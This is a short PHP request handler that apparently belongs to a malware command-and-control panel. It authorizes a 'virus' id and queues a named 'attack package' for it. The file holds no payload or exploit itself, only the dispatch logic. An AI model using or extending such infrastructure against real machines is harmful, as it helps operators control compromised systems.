<?php

use Kelvinho\Virus\Attack\AttackInterface;
use Kelvinho\Virus\Authenticator;
use Kelvinho\Virus\Header;
use function Kelvinho\Virus\checkVariable;

require_once(__DIR__ . "/../autoload.php");

$virus_id = checkVariable($_POST["virus_id"]);
$attack_package = checkVariable($_POST["attack_package"]);
$name = checkVariable($_POST["name"]);

if (strlen($name) > 50) {
    Header::badRequest();
}

if (Authenticator::authorized($virus_id)) {
    $attack = AttackInterface::new($virus_id, $attack_package, $name);
    if ($attack == null) {
        Header::badRequest();
    } else {
        $_SESSION["attack_id"] = $attack->getAttackId();
        Header::ok();
    }
} else {
    Header::forbidden();
}